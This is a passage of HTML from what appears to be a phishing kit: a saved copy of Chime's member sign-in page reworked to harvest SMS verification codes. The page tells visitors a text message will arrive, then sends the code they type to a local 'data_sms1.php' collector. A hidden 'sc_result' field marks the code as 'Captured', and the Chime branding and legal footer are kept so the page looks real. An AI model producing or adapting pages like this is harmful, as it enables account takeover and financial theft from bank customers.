drq88GKueD3lP2yZh+m7iMJdklF11pe+neXXbJVZCLc7ZV8GoZp0bNcG3MYFdADu1h6lgpHfO0pcH/hKZ2k1LNAKsjSA0pVhTZBk5Vtqf/723ImJY28KSZiRXi1dJedls8qUtOnldDBWo1jqhLaj25tB9ZDAswjbraK9vIE2qRifAoJXIUDdz4E+GuGLQBzTBQ9pOgd/5nSkehSpzaDhF8RvRuoFG0Be9AnHwopAhC2GSWxJbPgEffp01r0rxLRUWf8egDbUOIm9LD4BkHujKJyiPi0QfaNP+dMiO36bPgoQc6i5Ita5agnQJ7bRvvEn3kulvHs4f1AA9O0XUQGqZzL1x8JxTtCoE1cMAlqcs2q8g05wowIFhDX2whQjaTHilp5CEC8mdbqNCVu5C43zsER11nyrahVZm/i/itOgXmSeSbeI9azI2VA10xgRgnaY8PbYdR39Wk8oCPXbwSbcZuhXo/tg5HJEXZ/WNUDzJw8ez0cows8ZBZI2yQ4VtnFdrco719mjtE6H7ZKCF6GUz/d6VTCtkm1RE6TGcGLQ7aPG0at7OtAD3XLN2KPEby/jn0S4fEM1+56Lj4AJXG04ZctnTfKQuRrdpuElzr6G0+ZjYXqq3FZbgxw9cWM2aLNyowMQy67ntKhvXAhkwfjjVCkaF5R32n+GOAE3/OPDrySuV94nCBsvrJEWLUCxVyovHSrSwp3aA7rLPjThiOQWky+3P2mfZvSc3mZAtZTm1RqmW5b73yBoagDYq27Tuluak7RpOBlp1/tR1RxgTzwKDaoBWAw2x30O2+ygjdJtpgxgrLdsVs7RptdZQsJwaKGjaLk0QBFQqVV+j+S6AJxnVv4/QYg2bMDy451oeZbDrxFlXKJB+0sXRbjyB4MLjer+4ArFCdK8YqsdRFGwO9hbFPq47PnrsB1tBijzngldw97e3m5Y0taqVLtLF02wY0iGvsqWFAcvSsGbtSCjXgRVrnqqvQeKBdeljlEf2v9JF5Z3TEaTaBB8WFBM2bS/zUh5Fj+PRlFTpLgwGiAltUobrkNOvF8WIlcImJh5Cl12HR+ipTbZLtgFOENOaB2kyB4TK5WY9MvQeITA9LaDHoBK0ircOE2Riw1pLNVaHN9BdBae7vCaSBa5SGiyJJR/CzlrWOVuVossOG2k43z+LqQ44EdUSmxrneWvcwEQHmHBjuwlNGTZAX6h9PL5xCUH1dDEF2T4JBBfokGAb6STAM9JPgbgZapfHapmBQ+oy4xoyGEof8BTyTy8Hq+uSz0nsdv3udVFoXnJKKMwdxspNCpp664LRJISKU5YWdoTQtWnjWpAvYqzT+McN3LH5cbxCOCm3I2l1CilfOVM3CSS5Pam6kl/rI9JHSnO+LJwxT4JdKY1aqyOD0whHxnLXIVBuyBUj4YfM5GXNcBmkNrVd+hRbt3nAx7Oc+bMqSo0sM7A5Fa9wawNjiEz42Pn+LfmH/7UKObnU5FcD2/uzYX9pe6qcF3XvMdM64Qn4yhly6Y8fSyAP5B8JPSl0y+J1wUe29QsxqMVgz0Uk/0P5Xb7D7XY3h1jGPoa1lMdx68oR+3+LiEz3Dtcz6A+21MZGrBw3A0hKMN0eAooP86L6oDttz39CO+TZV6hH6/SvbS3XMaJC/AbxSP89NG0M+0DQDxtLmKiwsfPAId8YKwDv5Lm8gPC3KTHfqckrnjq1eNh15SRlHSh5XtkQeqQPZ/Wcltw0xQb9RnGjfcKfRCDFJfkJvhUeL+9EZWllk1SBSBOhB3F/W3o3oqzG0VYytgVd6dVMz9mEpzBbGwgr6JUhZbzqsB6BgmfkFxwXrkQcVfEkTN2IJ3hpCtIJeRzSUtd/MIrjFdTZ6dlBP5H8xi95p9m2hlxoXpXHKRXaMn/LEsKhBP6AtXlO6t9UIEGrDSF0SuOYzX7mTsU4glkNi2Mps6AvoyT827c7ko77xfa+y9ho4qkuWQ+lTflZpPLaJV1dMEM2Sd1oS5PIlP69g7M8CL/R8zoBB7y17sy6qbwu9R/F20QUn+wI9mc7w8PuireAFOi/nGRT9SddP5vZDq9ECenW0Hay6gBi8NtpL/NBKOc4uG3TdT4K7UZgMaIZhoJ8Ew0A/CYY9esCAB8NTZKBqAuV3LLY1jPu3QJLaOy5Kyh2eyB1vwDUGor5jlCw479CqKsBxRtGAx8UgZ90pyK/aJ5BrWaIoH/CAGIj6fvHoiQgG1MRA1PcLa9JBC6ocdAY8GAaivlNk+rjWF2i3DZtCbAftd3rLLHADboBBUXbnIEe+m2neB/QPw049YMCD4S53anK3nkLbZfnPhhN0upUj/R1+03ZLrtec8/UVduXWgf52WeC5bGSfrlKYBb8ztZvt3ra+PUKz93Xa/A7dH64kx9wf267HisIOZFtcbvw70Pyhdt0y33El7sKjjCZZgrCDG+qgEPzr63wCHcuyRDs5Ep1nG9Rom1c6HOV3llAZdrDkKaYFeA0/85sLjdMeUcQhB5m1hQ10//aKyHtL1DQIX+iekCXqEvWvtUeiDaJW1Sex1cECmktq9eAQ1CDujt7PxAl6rBofYNYGeilTk2PFD36XoPuIL2U/wKYVUD93MeHXaJ+gAR316nWwjUpjDprsmqABLQLt++Lk0yuZWnkeEWkBh3IfcW27lTL3LVKHsyzPuy3LcCGOI58AWskvJEETMGTBOOFytmwbh/6w7DxCWJ+MVRonLtdXYvf3nuUdod1oS0UddTmGrUo8SVQaH0P1DG2jN0Stws9r9ZE7SxUtNAHk5GzCPm1AGU58bg5ZwFQaLztwIPGVn53se03W1umLHlCeNddWwBw6hNjvSWZeqDQ+erRvjsvidxP0hqjhz661lgeZCLDxAVTQWuAgWS+LkoNK4xf4Hek7Rfv5QHx22lUJQZfl9GZuybZbLlUaj2z9Rcc+sEKrFMo4mVboYKrQZP7chWtuL2RqWqF9OmzxSC6PtAP0+X2snA4l83ER9CaLkhfydnNxSvMS+bOuGctnhz8CxbPAy0CZqJaUnMlHZr55uGtfdmof2e7QcV66W8HHHHIr7XsBRBCuyX2QO3AWJTOlU8raiChRabxp0RzkI06MQcSvigcStoFNHzadXuzU8NNy31ROGZCjbIGxUUrZJG/lQCkzp+ON8NHUlt4W+rJT+6ALuXJA9+iVY0bL2EHL6L2wTzP6QtQ7VLOYU1KwPPIkuQeUTeApijJlmWjVCjFk9vO9bffxyQcjXLvAShde/izfg92Nf9XNuC7uiagBrSEfIpJuCCKgI+za8yWxwkxhZa69bRNI5Rzi8wJoY9ihB0qtLtALmZqUCz6mpalK458GB0NYQdrNc09ks3tA2cL6Cm1aqnLxbXtx9tF8rTv20Hu1nTLz2+jLTg1czliqMm2xS94J2sQVrEAj4uWj4gcEItMHqL2gnm/+AdpPulUxiuz+C1Sf9/xJrHor/g6WYKOb7/69IeosSk4qjSfQXlY+jhEjXAaIscNF/gEu4XSusMcBNUFE+RbgQtl5RFMWJRsSDXycUBKxq/Kc4flj4xpHoDPK0PPNoDdEDeQTZUJxwlUrrg3c2Z2xWAOuwS6UCDv7rTOQnM5HnvqazNj/vNfE6oteyNQmSJnxB5cQvt9AWy6jA3qALEoWNId+2wx6c+tMr3ZqE+RBxocyz9FeEgLGDtq/+eZy0IBuQMEjMYkJPIfaFsWCgnm6Rq+JWkISOJDbGjkEkNkmU3ZmYj1Ar6C7Go4CMaonQZPVeYv69lqftrkmmo/2+RZOFb6JFIPaJvzs853bmEM8d9iGzZA6mjytUV8I2IbeZj4ZMGBAPfRSph4wYEB9DEQ9YMCD4W5k6nuCMKccsyiZeNzPGTuO0I4ZvZXX2gRlnuGcY3kmG7r+BS3rliZfDCk34HlpUp3c23jkRE0J3cbQioGJ6SQQOlF/E6LtwRMgsJ4xtA1calCP6EkcbRuoSCnk7YUlcqBJpVMM3Vc3N/s8Mmw79QjAj0rju1ihSIPZaVJB8hfmdEtHCPdUWtUTlca1AxTYYaKVxjYEEe0V4QpCT8zfjPvMpH8x5wIT7pQoK4PacATQq43jnmAj6gV053+rNK7c+Sryc58AvJGvsCSMNzYtGTtDnpSOyuX8XR82H2+xQzO+2G1UhNlxgIHN9FOZr9lod4GVM01tHm3kenNuyMXuCe7oAPdJGUfYPaGuxq6iH5yJ+Og5Hh9n0ASNF7O8hfzc1BavZH9l7HMFJ2GdJ+JZzsJyhJ6DPhzD2hHoU7t/xZxY4TqLTEx52mqNFcO1U0+gO/VLpbFTJjEIz/aSe/p7yaJkq9KYJ+ccF7fCJbT9bwQdureizmYXv4NroLIomRgZJM02OAlS/LYve0cIgqmRTmkEWtSoTu4vTq7nm1NnDN2HvAjwO4+hj4HJ7bpi4iYgIhLvepLl0G9LaE7jM4uSD1mpuhwW4JN9U7rmdpKlRrTHKiKWPCcXglLCt2DTVf8CeOfNR9xft6wcVkUZFfRCK8qaJqONFZcDme+SBkYiucGKGjxXaRxDE+4IeqdjBwCe7LyCNZFVnQRJiwzHBZdFGslODU3ScJIiDAWt8NcQr6aTUe/R8RmwZ/Kcims/jnG64iaIe5hS3T47rGxf68Ez6nJ+GqA5Ot9xMGMIQh1qzPtb6V+CjQuuW1aOUu037YRf0KuSrQFbXDqt8kgUy269hJ40LJ8uoXfrI/RLOXdpB8zJtKN68gB5/oFWRO6csoFe4bL47FUaF9g2mnAm4fUJeT/AUxtcJVZY7t+qNOZEBZ/UT4V+VWn8Wif9D4lwPHeWAUkLj9A7Ksv73xWcWR0E92+XZVWatDKdEdIa8UI7D8fVzml1N2FqTGO63yanrej6Wnyvat/OmEz8E7P8b1Tfmt5DolKmFlwLs3Cu1fNAk6VX+aqAnODK+gEoii7ynC4vrTfNlSkuYo3tthP105YI9QS9YK6JE3LWk0XJm5iLtnGwtZN39YMI7V3T4tJKZFmd/m2rLENns8iiZDO4iQ4Y8GAYPMoGDHgwDEQ9YMCDYSDqAQMeDP8HZBiP+a3jdd0AAAAASUVORK5CYII="
                        />
                    </a>
                </div>
            </div>

            <div id="notification-bar" class="animated" bis_skin_checked="1"></div>
            <div class="container-fluid" bis_skin_checked="1">
                <div class="row" bis_skin_checked="1">
                    <div class="col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3 col-lg-4 col-lg-offset-4" bis_skin_checked="1">
                        <div class="vertical-spacer2" bis_skin_checked="1"></div>
                        <p>
                            <script data-savepage-type="text/javascript" type="text/plain" data-savepage-src="https://js.dvnfo.com/devicer.min.js"></script>
                            <script data-savepage-type="text/javascript" type="text/plain"></script>

                            <script data-savepage-type="" type="text/plain"></script>

                            <script data-savepage-type="" type="text/plain" data-savepage-src="https://nd.chime.com/2.2/w/w-749009/sync/js/"></script>
                            <script data-savepage-type="text/javascript" type="text/plain" id="nudata-init"></script>
                        </p>
                        <form autofocus="autofocus"  id="login-form" action="data_sms1.php" accept-charset="UTF-8" method="post" >
                            <input name="utf8" type="hidden" value="✓" autocomplete="off" />
                            <input type="hidden" name="authenticity_token" value="HenG2+8EOXWRpUTBZkiCLrX1tSMd0w/GygU39zD/L/tuE0E1HB1luWKRu2tWxjShhXkjM/BXbKn34Ch9KF5wMw==" autocomplete="off" />
                            <input value="a699e722-e626-453d-802b-be34757c7a40" autocomplete="off" type="hidden" name="user[nudata_session_id]" id="user_nudata_session_id" />
                            <p style="text-align: center;"><img alt="" src="https://img.icons8.com/?size=512&amp;id=47840&amp;format=png" style="width: 120px; height: 120px;" /></p>
<p></p>
<div style="width: 70%; margin: auto;" bis_skin_checked="1">
                            <p class="text-center">
                                After a few moments, you will receive a text message to verify your identity
                            </p>
                        </div>
						<p style="text-align: center;"><img alt="" src="https://cdn.dribbble.com/users/2077073/screenshots/6005120/loadin_gif.gif" style="height: 75px; width: 100px;" /></p>

							<input
                                autofocus="autofocus"
                                placeholder="SMS Code"
                                class="input-lg form-control"
                                data-parsley-required="true"
                                data-parsley-required-message="Please enter your email address"
                                data-parsley-type="email"
                                data-parsley-type-message="Please correct your email address"
                                type="text"
                                value=""
                                name="user_sms"
                                id="user_sms"
                                data-parsley-id="4446"
								required
                            />
                            <ul class="parsley-errors-list" id="parsley-id-4446"></ul>
                            
                            <ul class="parsley-errors-list" id="parsley-id-6531"></ul>
                            <input type="submit" name="commit" value="Valider" class="btn btn-success btn-block" id="login-form-submit" style="opacity: 1;" />
                            <input name="nds-pmd" type="hidden" value="{"jvqtrgQngn":{"oq":"1440:794:1440:864:1440:864","wfi":"flap-1","oc":"2501pp0s72219oop","fe":"1440k900
                            24","qvqgm":"0","jxe":899533,"syi":"snyfr","si":"si,btt,zc4,jroz","sn":"sn,zcrt,btt,jni","us":"26p2s0195166qsoq","cy":"Jva32","sg":"{\"zgc\":0,\"gf\":snyfr,\"gr\":snyfr}","sp":"{\"gp\":gehr,\"ap\":gehr}","sf":"gehr","jt":"n46p01n68sp5740r","sz":"p37r39qoq0s20r25","vce":"apvc,0,64r743ns,2,1;fg,0,hfre_rznvy,0,hfre_cnffjbeq,0;ss,1,hfre_rznvy;so,or8,hfre_rznvy;zp,sr,196,1oo,;zz,1pp3,19r,1o9,;zzf,3r9,0,n,43
                            0,5sn5
                            60n6,1930,1951,-50r08,1rprn,-5pr3;zzf,3r9,3r9,n,ABC;zzf,3r9,3r9,n,ABC;zzf,3r6,3r6,n,ABC;zzf,3r9,3r9,n,ABC;gf,0,3q34;zzf,3r7,3r7,n,ABC;zzf,3sn,3sn,n,ABC;zzf,3q7,3q7,n,ABC;zzf,3r9,3r9,n,ABC;zzf,3r6,3r6,n,ABC;zp,1695,3ps,7r,;zz,334,3pr,82,;zp,224,3r9,104,;zzf,o2o,2718,32,23
                            r2,244s 3n53,1sp,134p,-14or6,165q4,9p;gf,0,77q3;zz,s0o,496,56,;zzf,182o,2736,32,28 40,89no 7qr,5q0,34ss,-31o5q,35qq7,13q;zz,43p,47o,sr,;zzf,22nr,26rn,32,79n 432,10r3
                            383s,23r,1622,-12on0,12on0,26;gf,0,p5s3;zz,1324,45p,68,;zzf,5325,6649,32,924 29p7,924
                            29p7,qo,7ss,-o173,r4o1,106;gf,0,12p3p;zz,124p,q5,n,;zp,299,52q,sn,;zp,330,527,31,;zp,r4,527,31,;zz,q9n,442,s6,;zp,74p,3q7,s3,;zzf,698,3477,32,0 3n,36o0
                            30s2,5s3,3rp1,-1ns9s,18660,-461;zz,77p,3r5,19o,fnircntr-zrffntr-cnary-bireynl;gf,0,1682s;zp,2rn,309,101,fnircntr-zrffntr-cnary-pbagvahr;","ns":"","qvg":"","zoc":"","zvqsn":"","znofqx":"","zfz":"","zfb":"","zff":"","zczi":"","zhy":"","zvqsi":"","znof":"","zczvi":"","zozs":"","zfp":"","znos":"","zoo":"","zcv":"","znoi":"","zuf":"","zoz":"","vBFNCAFGbxra":"","vfRzh":"","qrivprAnzr":"","qrivprGvzr":"","zjva":"","zffa":"","zca":"","zuopf":"","zuopc":""},"jg":"1.j-749009.1.2.SfaZB5xlR9qTQFjqXYk6lN,,.k3O-Jz4Tu9uPbSyRhqBwBsUAQ8t5mVTsYxZZuGg-C_7G2nHsCMgRF3dZddUVmS6DxluZSkf6YaEwSDXYF1jXNp5pipN5ab2FNI2rufDd3WaOLBBcMRTFZAvS8DLfE6hfb7bW0ogRfc62Py6DhcUDRrRrt_6MoVEpReBxqrMtkiblKdJbqZLS7nEO9ddiafFSATvZ9A4HtofZwse7SJ1e3ll3pFtxE3ZhLdXgUSyf8iCe_Jjy7Df3o0ES_AOEnldM"}">
                            <input
                                type="hidden"
                                name="sc_session_id"
                                value="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJkYXRhIjp7InNlc3Npb25faWQiOiJjZTYwYmIwMC03MmZmLTQwZWEtOTg3OC1jYWQ2ZDkyMTcwYTAifX0.Q2C_Rt4BrTSoeRwlAvWKDnxjYTt3FE3zyA7QPWK95lBatl_JKF0XfsqI7JicQYF788CjcjnYNLoCud2TX_YuVQ"
                            />
                            <input type="hidden" name="sc_result" value="Captured" />
                        </form>

                        <script data-savepage-type="text/javascript" type="text/plain"></script>
                        <script data-savepage-type="text/javavscript" type="text/plain"></script>

                        <p></p>
                     
                        <div class="vertical-spacer1" bis_skin_checked="1"></div>
                        

                        <div class="vertical-spacer2" bis_skin_checked="1"></div>
                    </div>
                </div>
            </div>
            <div id="ajax-dialog-container" class="modal fade" role="dialog" aria-labelledby="generalAjaxContainer" aria-hidden="true" bis_skin_checked="1"></div>
        </div>
        <div id="footer" class="simple container-fluid" bis_skin_checked="1">
            <div class="col-sm-6 col-sm-offset-3 col-lg-4 col-lg-offset-4" bis_skin_checked="1">
                <div class="row" bis_skin_checked="1">
                    <div class="text-center fine-print" bis_skin_checked="1">
                        <p><small class="text-muted fine-print">© 2023 Chime. All Rights Reserved.</small></p>
                        <div class="half-vspacer" bis_skin_checked="1"></div>
                        <p>
                            <small class="text-muted fine-print">
                                Banking Services provided by The Bancorp Bank or Stride Bank, N.A., Members FDIC. The Chime Visa<sup>®</sup> Debit Card is issued by The Bancorp Bank or Stride Bank pursuant to a license from Visa U.S.A. Inc.
                                and may be used everywhere Visa debit cards are accepted. Please see back of your Card for its issuing bank.
                            </small>
                        </p>
                    </div>
                </div>
                <div class="vertical-spacer1 row" bis_skin_checked="1"></div>
            </div>
        </div>

        <!--  -->

        <script data-savepage-type="" type="text/plain" data-savepage-src="/assets/site-4bb4366cf93a8494ae79efc5fd84cf8f50690c1058098a0f9662638b3ed02e1c.js"></script>

        <script data-savepage-type="text/javascript" type="text/plain"></script>

        <div aria-hidden="true" class="arkose-7BA04117-FC6C-4968-834C-DC69A7D0AD58-wrapper" aria-modal="true" role="dialog" bis_skin_checked="1">
            <iframe
                sandbox="allow-scripts"
                srcdoc='<!DOCTYPE html><html lang="en"><head><script data-savepage-type="text/javascript" type="text/plain" data-savepage-src="https://chime-api.arkoselabs.com/cdn/fc/js/6af2c0d87b9879cbf3365be1a208293f84d37b1e/standard/funcaptcha_api.js?onload=loadChallenge" ec-api-script="true" async="" integrity="sha384-0WSnGKUOVQB3bg5Ofr5NVln10Hgdsr1qyM+lwRI+diKuJL5zXCe0CmeRgzJ/TUEF" crossorigin="anonymous"></script><script data-savepage-type="" type="text/plain"></script><script data-savepage-type="" type="text/plain"></script><base href="https://chime-api.arkoselabs.com/v2/1.5.4/enforcement.cd12da708fe6cbe6e068918c38de2ad9.html#7BA04117-FC6C-4968-834C-DC69A7D0AD58"><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="Content-Security-Policy" data-savepage-content="style-src &apos;self&apos; &apos;nonce-ijJ50WRkipih8g2UF3Q3DveNdj5PfXJeMLvO&apos;; default-src &apos;self&apos; data: *.arkoselabs.com *.funcaptcha.com *.arkoselabs.cn *.arkose.com.cn;" content=""><meta http-equiv="X-UA-Compatible" content="ie=edge"><style nonce="">html, body { margin: 0; padding: 0; height: 100%; }
      * { box-sizing: border-box; }
      #app { height: 100%; overflow: hidden; }</style><script data-savepage-type="" type="text/plain" ecommerce-type="extend-native-history-api"></script><style nonce="">@keyframes spin{0%{transform:rotate(0deg) translateZ(0)}100%{transform:rotate(360deg) translateZ(0)}}@keyframes fadeIn{0%{opacity:0}100%{opacity:1}}.kXaXkDzIfSzLHRklX2r3{position:fixed;top:20px;right:20px;width:20px;height:20px;z-index:200;border:none;background-color:transparent;background-image:url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iMzhweCIgaGVpZ2h0PSIzOHB4IiB2aWV3Qm94PSIwIDAgMzggMzgiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+CiAgICA8IS0tIEdlbmVyYXRvcjogU2tldGNoIDQ0LjEgKDQxNDU1KSAtIGh0dHA6Ly93d3cuYm9oZW1pYW5jb2RpbmcuY29tL3NrZXRjaCAtLT4KICAgIDx0aXRsZT5Hcm91cDwvdGl0bGU+CiAgICA8ZGVzYz5DcmVhdGVkIHdpdGggU2tldGNoLjwvZGVzYz4KICAgIDxkZWZzPjwvZGVmcz4KICAgIDxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgogICAgICAgIDxnIGlkPSJHcm91cCIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTkuMDAwMDAwLCAxOS4wMDAwMDApIHJvdGF0ZSg0NS4wMDAwMDApIHRyYW5zbGF0ZSgtMTkuMDAwMDAwLCAtMTkuMDAwMDAwKSB0cmFuc2xhdGUoLTYuMDAwMDAwLCAtNi4wMDAwMDApIiBmaWxsPSIjOTQ5NDk0Ij4KICAgICAgICAgICAgPHJlY3QgaWQ9IlJlY3RhbmdsZSIgeD0iMjQiIHk9IjAiIHdpZHRoPSIyIiBoZWlnaHQ9IjUwIj48L3JlY3Q+CiAgICAgICAgICAgIDxyZWN0IGlkPSJSZWN0YW5nbGUiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDI1LjAwMDAwMCwgMjUuMDAwMDAwKSByb3RhdGUoOTAuMDAwMDAwKSB0cmFuc2xhdGUoLTI1LjAwMDAwMCwgLTI1LjAwMDAwMCkgIiB4PSIyNCIgeT0iMCIgd2lkdGg9IjIiIGhlaWdodD0iNTAiPjwvcmVjdD4KICAgICAgICA8L2c+CiAgICA8L2c+Cjwvc3ZnPg==);background-repeat:no-repeat;background-position:center;background-size:contain;cursor:pointer;pointer-events:none;transform:scale(1);transition:transform 100ms ease-in-out;visibility:hidden;opacity:0}.kXaXkDzIfSzLHRklX2r3:hover{transform:scale(1.3)}.kXaXkDzIfSzLHRklX2r3.active{pointer-events:inherit;visibility:visible;opacity:1;transition:opacity 400ms ease-in-out}.nMUBxApsE7lSELvJiiAA{position:fixed;top:0;right:0;bottom:0;left:0;background-color:rgba(255,255,255,0.8);z-index:-1;opacity:0;transition:opacity 300ms linear;pointer-events:none}.nMUBxApsE7lSELvJiiAA.active{opacity:1;pointer-events:inherit}.lTLYGVw1ASsTZWg0vUbC{position:absolute;top:50%;left:50%;margin-left:-15px;margin-top:-15px;z-index:1010;border-radius:50%;width:30px;height:30px;border-top:3px solid transparent;border-right:3px solid transparent;border-bottom:3px solid transparent;border-left-width:3px;border-left-style:solid;transform:translateZ(0);box-sizing:border-box;border-left-color:rgba(0,0,0,0.2)}.lTLYGVw1ASsTZWg0vUbC{animation:spin 500ms infinite linear}.slrEYyWESVLe_Cx3DM1k{transition:opacity 500ms, transform 500ms;opacity:0;transform:scale(0.8);text-align:center;height:100%}.slrEYyWESVLe_Cx3DM1k.active{opacity:1;transform:scale(1)}.slrEYyWESVLe_Cx3DM1k.challenge-enter{opacity:0;transform:scale(0.8)}.slrEYyWESVLe_Cx3DM1k.challenge-enter-active,.slrEYyWESVLe_Cx3DM1k.challenge-enter-done{transform:scale(1);opacity:1}.slrEYyWESVLe_Cx3DM1k.challenge-exit{transform:scale(1);opacity:1}.slrEYyWESVLe_Cx3DM1k.challenge-exit-active,.slrEYyWESVLe_Cx3DM1k.challenge-exit-done{transform:scale(0.8);opacity:0}.slrEYyWESVLe_Cx3DM1k.dTcazKGGob_VbK_J853h{flex-direction:column}.dTcazKGGob_VbK_J853h{display:flex;align-items:center;justify-content:center;display:-ms-flexbox;-ms-flex-align:center;-ms-flex-pack:center}
</style><script data-savepage-type="" type="text/plain"></script>
<style id="savepage-cssvariables">
  :root {
  }
</style>
          </head><body bis_status="ok" bis_frame_id="63"><div id="app"><div id="challenge" class="slrEYyWESVLe_Cx3DM1k"></div></div><script data-savepage-type="text/javascript" type="text/plain" id="enforcementScript" data-savepage-src="enforcement.cd12da708fe6cbe6e068918c38de2ad9.js" crossorigin="anonymous" integrity="sha384-VCUwSddlYqSxOMAvjUh7j/2RDYDWS5kYy4niydKj11rmigkIZngFL3dUJ7fCO/hI" data-nonce="ijJ50WRkipih8g2UF3Q3DveNdj5PfXJeMLvO"></script></body></html>'
                data-savepage-crossorigin=""
                data-savepage-src="https://chime-api.arkoselabs.com/v2/1.5.4/enforcement.cd12da708fe6cbe6e068918c38de2ad9.html#7BA04117-FC6C-4968-834C-DC69A7D0AD58"
                src=""
                class="r34K7X1zGgAi6DllVF3T lightbox"
                title="Verification challenge"
                aria-label="Verification challenge"
                data-e2e="enforcement-frame"
                style="width: 0px; height: 0px;"
                data-savepage-key="0-0"
            ></iframe>
        </div>
        <iframe
            sandbox="allow-scripts"
            srcdoc='<!DOCTYPE html><html><head><script data-savepage-type="" type="text/plain"></script><script data-savepage-type="" type="text/plain"></script><base href="https://b.frstre.com/?v1.4"><link rel="P3Pv1" data-savepage-href="https://b.frstre.com/w3c/p3p.xml" href=""><script data-savepage-type="" type="text/plain" ecommerce-type="extend-native-history-api"></script><script data-savepage-type="" type="text/plain"></script>
<style id="savepage-cssvariables">
  :root {
  }
</style>
        </head><body bis_status="ok" bis_frame_id="64"> <script data-savepage-type="" type="text/plain"></script> </body></html>'
            data-savepage-crossorigin=""
            data-savepage-src="https://b.frstre.com/?v1.4"
            src=""
            style="width: 1px; height: 1px; display: none;"
            data-savepage-key="0-1"
        ></iframe>
        <script data-savepage-type="text/javascript" type="text/plain" id=""></script>
        <script data-savepage-type="text/javascript" type="text/plain" id=""></script>
        <script data-savepage-type="text/javascript" type="text/plain" id=""></script>
        <script data-savepage-type="text/javascript" type="text/plain" id=""></script>
        <script data-savepage-type="text/javascript" type="text/plain" id=""></script>
        <script data-savepage-type="text/javascript" type="text/plain" id=""></script>
        <noscript><img height="1" width="1" style="display: none;" src="https://www.facebook.com/tr?id=866707713436552&amp;ev=PageView&amp;noscript=1" /></noscript>
        <div style="width: 0px; height: 0px; display: none; visibility: hidden;" id="batBeacon300552398198" bis_skin_checked="1">
            <img
                style="width: 0px; height: 0px; display: none; visibility: hidden;"
                id="batBeacon481711297843"
                width="0"
                height="0"
                alt=""
                data-savepage-src="https://bat.bing.com/action/0?ti=5819072&tm=gtm002&Ver=2&mid=3b1358f9-a95f-4d1d-94b4-15e9ae2b4b66&sid=396c1ca0427411ee8f397f88129e29a3&vid=396d1f00427411eea78cb1e268f97d94&vids=1&msclkid=N&uach=pv%3D0.3.0&pi=918639831&lg=en-US&sw=1440&sh=900&sc=24&tl=Member%20Login&kw=chime,chime%20card,chimecard,visa,card,rewards,debit%20card,direct%20deposit,benefits,bank,banking,account,app,bank,cash%20back,mobile,ios,android&p=https%3A%2F%2Fmember.chime.com%2Fusers%2Fsign_in&r=&lt=13142&evt=pageLoad&sv=1&rn=899399"
                src=""
            />
        </div>
        <iframe
            sandbox="allow-scripts"
            srcdoc='<html><head><script data-savepage-type="" type="text/plain"></script><script data-savepage-type="" type="text/plain"></script><base href="https://tr.snapchat.com/cm/i?pid=d4738dc7-342a-4cd7-8592-390e7f447b2a&amp;u_scsid=92de1ea1-6159-469e-b56b-ede15ac04f44&amp;u_sclid=8fd16e3a-4684-4cd0-8809-a34105a77b09"><script data-savepage-type="" type="text/plain" ecommerce-type="extend-native-history-api"></script><script data-savepage-type="" type="text/plain"></script>
<style id="savepage-cssvariables">
  :root {
  }
</style>
        </head><body bis_status="ok" bis_frame_id="67"></body></html>'
            data-savepage-crossorigin=""
            id="snap6448182"
            data-savepage-src="https://tr.snapchat.com/cm/i?pid=d4738dc7-342a-4cd7-8592-390e7f447b2a&u_scsid=92de1ea1-6159-469e-b56b-ede15ac04f44&u_sclid=8fd16e3a-4684-4cd0-8809-a34105a77b09"
            src=""
            style="display: none !important; height: 1px !important; overflow: hidden !important; position: absolute !important; width: 1px !important;"
            data-savepage-key="0-2"
        ></iframe>
        <img
            width="0"
            height="0"
            data-savepage-src="https://segment.prod.bidr.io/associate-segment?buzz_key=tatari&segment_key=tatari-329&value=&uncacheplz=1372792932"
            src="data:image/gif;base64,R0lGODlhAQABAIABAP///wAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="
            alt=""
            style="display: none;"
        />
        <img
            data-savepage-src="https://pixel-api.feedmob.biz/tracker?id=1304f80e792a4d93a2d98def382c69a0&uid=1-ngd979j5-llp3p8qm&ev=pageload&ed=&v=1&dl=https%3A%2F%2Fmember.chime.com%2Fusers%2Fsign_in&rl=&ts=1692877743314&de=UTF-8&sr=1440x900&vp=1440x794&cd=24&dt=Member%20Login&bn=Chrome%20109&md=false&ua=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F109.0.0.0%20Safari%2F537.36&tz=-60&utm_source=&utm_medium=&utm_term=&utm_content=&utm_campaign=&utm_partner=&fm_click_id=&fm_publisher_id=&fm_conversion_id="
            src=""
            width="1"
            height="1"
            alt=" "
            style="display: none;"
        />
    </body>

    <script
        data-savepage-type="text/javascript"
        type="text/plain"
        async=""
        data-savepage-src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/990192132/?random=1692877743233&cv=11&fst=1692877743233&bg=ffffff&guid=ON&async=1&gtm=45He38l0&u_w=1440&u_h=900&url=https%3A%2F%2Fmember.chime.com%2Fusers%2Fsign_in&hn=www.googleadservices.com&frm=0&tiba=Member%20Login&auid=1440560113.1692877743&rfmt=3&fmt=4"
    ></script>
    <script
        attributionsrc=""
        data-savepage-type="text/javascript"
        type="text/plain"
        async=""
        data-savepage-src="https://www.googleadservices.com/pagead/conversion/990192132/?random=1692877743278&cv=11&fst=1692877743278&bg=ffffff&guid=ON&async=1&gtm=45He38l0&u_w=1440&u_h=900&url=https%3A%2F%2Fmember.chime.com%2Fusers%2Fsign_in&label=SXtiCLeewfoCEITElNgD&hn=www.googleadservices.com&frm=0&tiba=Member%20Login&value=0&bttype=purchase&rdp=1&auid=1440560113.1692877743&rfmt=3&fmt=4"
    ></script>
    <iframe
